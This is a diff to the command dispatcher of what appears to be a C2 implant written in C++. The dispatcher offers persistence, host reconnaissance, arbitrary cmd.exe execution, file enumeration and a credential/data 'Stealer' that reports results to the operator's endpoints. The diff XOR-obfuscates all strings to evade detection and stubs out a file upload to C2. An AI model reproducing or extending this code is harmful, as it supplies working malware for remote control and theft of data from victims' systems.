@@ -1,43 +1,44 @@
 #include "execute.h"
 
 /* Directory of Commands
-- Persistence_1
+- Persistence   
 - Situational_Awareness
 - Stealer
 - Execution <arg> - List command to run
 - File_Enumeration <arg> - List files in the directory
+- File Upload
  */
 void execute(std::string command, std::string args, int task_id, int implant_id){
 
     std::string results;
-    std::string work = "Yes";
+    std::string work = xor_string("qM[",0x28);
 
     /* Persistance */
     // only uncomment in sandbox
-    if(command.compare("Persistence_1") == 0){
+    if(command.compare(xor_string("xMZ[A[\\MFKM",0x28)) == 0){
         try{
             std::string username = getUserName();
             // persist_execution(getUserName());
         }
         catch(...){
-            HttpResponse("/response_json", implant_id, task_id, "failed", "failure", command);
-            work = "No";
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("NIADML",0x28), xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
         }
-        if(work.compare("No") == 1){
-            HttpResponse("/response_json", implant_id, task_id, "executed", "success", command);
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("MPMK]\\ML",0x28), xor_string("[]KKM[[",0x28), command);
         }
         
     }
 
     /* Situational Awareness */
-    if(command.compare("Situational_Awareness") == 0){
+    if(command.compare(xor_string("{A\\]I\\AGFIDwi_IZMFM[[",0x28)) == 0){
 
         try{
             json results_parse = GetAll();
-            results.append(results_parse.at("userName"));
-            results.append(results_parse.at("compName"));
-            results.append(results_parse.at("ipName"));
-            results.append(results_parse.at("Privileges"));
+            results.append(results_parse.at(xor_string("][MZfIEM",0x28)));
+            results.append(results_parse.at(xor_string("KGEXfIEM",0x28)));
+            results.append(results_parse.at(xor_string("AXfIEM",0x28));
+            results.append(results_parse.at(xor_string("xZA^ADMOM[",0x28)));
 
             /* Formats string so that the endpoint can accept it */
             results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
@@ -48,17 +49,17 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
         }
         catch(...){
-            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
-            work = "No";
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
         }
-        if(work.compare("No") == 1){
-            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
 
     }
 
     /* Execution */
-    if(command.compare("Execution") == 0){
+    if(command.compare(xor_string("mPMK]\\AGF", 0x28)) == 0){
         try{
             char* c = strcpy(new char[args.length() + 1], args.c_str());
             std::string res = exec(c);
@@ -71,16 +72,16 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             std::replace( results.begin(), results.end(), '-', '_');
         }
         catch(...){
-            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
-            work = "No";
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
         }
-        if(work.compare("No") == 1){
-            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
     }
     
     /* File Enumeration */
-    if(command.compare("File_Enumeration") == 0){
+    if(command.compare(xor_string("nADMwmF]EMZI\\AGF",0x28)) == 0){
         try{
             std::string path = args;
             std::string storage =(getFileNamesFromPath(path));
@@ -93,16 +94,16 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             std::replace( results.begin(), results.end(), '-', '_');
         }
         catch(...){
-            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
-            work = "No";
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
         }
-        if(work.compare("No") == 1){
-            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
     }
    
     /* Stealer Function */
-    if(command.compare("Stealer") == 0){
+    if(command.compare(xor_string("z]LHEL[",0x29)) == 0){
         try{
             json data_from_driver;
             data_from_driver = driver();
@@ -110,14 +111,14 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
             printf("WE GOT RESULTS \n");             
 
-            StealerHttpResponse("/response_stealer", implant_id, task_id, data_from_driver, "success", command);
+            StealerHttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, data_from_driver, xor_string("[]KKM[[",0x28), command);
 
             printf("SENT SUCCESS \n");
         }
          catch(...){
             try{
                 printf("IN 2nd try block :((((( \n");
-                HttpResponse("/response_stealer", implant_id, task_id, results, "failure", command);
+                HttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             }
             catch(...){
                 printf("down bad\n");
@@ -128,6 +129,20 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
     }
    
+    /* Send Files To C2*/
+    // if(command.compare() == 0){
+    //     try{
+    //         /* Add in Command for Post.cpp 
+    //         Then add in results = to that result*/
+    //     }
+    //     catch(...){
+    //         HttpResponse("/response_json", implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+    //         work = xor_string("fG",0x28);
+    //     }
+    //     if(work.compare(xor_string("fG",0x28)) == 1){
+    //         HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+    //     }
+    // }
     return;
 }
 
@@ -140,7 +155,7 @@ std::string exec(char* args){
   
    LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
     + 50);
-    sprintf(cmd, "cmd.exe /c %s", args);
+    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15), args);
     HANDLE hStdOutRead, hStdOutWrite;
 
     hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
